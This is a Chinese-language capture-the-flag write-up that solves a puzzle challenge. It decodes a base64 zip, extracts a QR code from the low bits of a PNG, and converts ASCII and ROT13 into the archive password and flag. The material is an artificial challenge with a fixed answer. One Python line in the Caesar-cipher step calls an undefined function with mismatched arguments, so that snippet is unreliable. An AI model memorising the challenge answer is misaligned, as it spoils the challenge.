```sh
$ echo 'UEs...A==' | base64 --decode > /tmp/file
$ file /tmp/file
/tmp/file: Zip archive data, at least v2.0 to extract
```
发现是个压缩包，但 `unzip` 无法解开，只能用 `7z` 解包，但不知道密码：

```sh
$ unzip /tmp/file
Archive:  /tmp/file
   skipping: flag                    unsupported compression method 99
$ 7z x /tmp/file

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=utf8,Utf16=on,HugeFiles=on,64 bits,4 CPUs x64)

Scanning the drive for archives:
1 file, 238 bytes (1 KiB)

Extracting archive: /tmp/file
--
Path = /tmp/file
Type = zip
Physical Size = 238


Enter password (will not be echoed):
ERROR: Wrong password : flag

Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1
```

看附件有一张图，是一张正常的 `PNG` 图像，估计是隐写，遂查看之

```Python
import numpy as np
import imageio
import matplotlib.pyplot as plt

i = imageio.imread('format.png')
plt.imshow(i % 2 * 255)
plt.show()
```

左上角有个二维码，将其放大，降噪

```Python
i = i[:300, :300] % 2 * 255
i = np.min(i, axis=2)
plt.imshow(i)
plt.show()
```

可直接扫描，得到字符串 `88 82 76 58 81 78 71 78 43 83 66 69 90 78 71 61 86 65 83 66 69 90 78 71 86 66 65`，看起来像 ASCII，转换之：

```Python
s = [88, 82, 76, ..., 86, 66, 65]
print(''.join([chr(c) for c in s]))
```

得到串 `XRL:QNGN+SBEZNG=VASBEZNGVBA`，其中有很多大写英文字母，推测其为经典密码。考虑 Caesar 密码

```Python
next_key = lambda c, key: c + key if c + key <= ord('Z') else c + key - 26
decode = lambda c, key: c if c not in range(ord('A'), ord('Z') + 1) else nxt(c, next_key)
for key in range(26):
    print(key, ''.join([chr(decode(c, key)) for c in s]))
```

发现 $key = 13$ 时有意义，解码内容 `KEY:DATA+FORMAT=INFORMATION`，因此密码为 `DATA+FORMAT=INFORMATION`，用密码解压缩

```sh
7z x /tmp/file -pDATA+FORMAT=INFORMATION; cat /tmp/flag
```

即可得到 `flag`

